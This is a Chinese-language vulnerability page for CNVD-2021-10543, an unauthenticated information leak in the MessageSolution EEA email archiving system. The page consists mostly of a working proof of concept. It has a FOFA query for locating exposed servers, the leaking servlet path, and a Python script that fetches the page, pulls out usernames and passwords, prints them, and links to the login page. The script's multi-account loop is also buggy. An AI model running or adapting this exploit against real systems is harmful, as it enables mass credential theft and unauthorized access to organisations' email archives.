# MessageSolution 企业邮件归档管理系统信息泄露漏洞 CNVD-2021-10543

MessageSolution企业邮件归档管理系统 EEA是北京易讯思达科技开发有限公司开发的一款邮件归档系统。该系统存在通用WEB信息泄漏，泄露Windows服务器administrator hash与web账号密码

FOFA：

```
title="MessageSolution Enterprise Email Archiving (EEA)"
```

PoC:

```
http://xxx.xxx.xxx.xxx/authenticationserverservlet/
```

poc.py：

```py
# CNVD-2021-10543
# MessageSolution 企业邮件归档管理系统 EEA 存在信息泄露漏洞
# fofa: title="MessageSolution"

import requests
import time
import json
from bs4 import BeautifulSoup
# 忽略SSL证书校验提醒
requests.packages.urllib3.disable_warnings()

def title():
    print("+-------------------------------------------------+")
    print("+-----------    CNVD-2021-10543   ----------------+")
    print("+----------- MessageSolution信息泄漏 --------------+")
    print('+--------- Fofa: title="MessageSolution" ---------+')
    print("+--------  use: python3 CNVD-2021-10543.py -------+")
    print("+-------------------------------------------------+")

def target_url(url):
    target_url = url + "/authenticationserverservlet/"
    login_url = url + "/indexcommon.jsp"
    # verify = False 忽略SSL证书校验
    try:
        res = requests.get(url=target_url, verify=False,timeout=5)
        if "administrator" in res.text and res.status_code == 200:
            print(f"[!] \033[31m目标系统: {url} 存在信息泄漏\033[0m")
            time.sleep(1)
            print("[!] \033[31m正在获取目标系统敏感信息.........\033[0m")
            bs_xml = BeautifulSoup(res.text,features="html.parser")
            user_names = bs_xml.findAll('username')
            passwords = bs_xml.findAll('password')
            i = 1
            print(f"[!] \033[31m获取到目标系统信息:\033[0m")
            if i < len(user_names):
                for user_name,password  in user_names,passwords:
                    print(f"   用户名: {user_name.text}    密 码: {password.text}")
                    i = i+1
            else:
                print(f"   用户名: {user_names[0].text}\n   密 码: {passwords[0].text}")
            print(f"\033[32m[0] 请访问: {login_url} 进行登录！")
        else:
            print(f"[0]  \033[32m目标系统: {url} 不存在信息泄\033[0m")
    except Exception as e:
        print(f"[!]  目标系统: {url} 出现意外错误：\n {e}")




if __name__ == "__main__":
    title()
    url = str(input("[0] 请输入目标站点URL:\n"))
    target_url(url)
```

ref:

* https://mp.weixin.qq.com/s/jehAIIYWrpkLtGvGN-LtFA
* https://github.com/Henry4E36/CNVD-2021-10543/blob/main/CNVD-2021-10543.py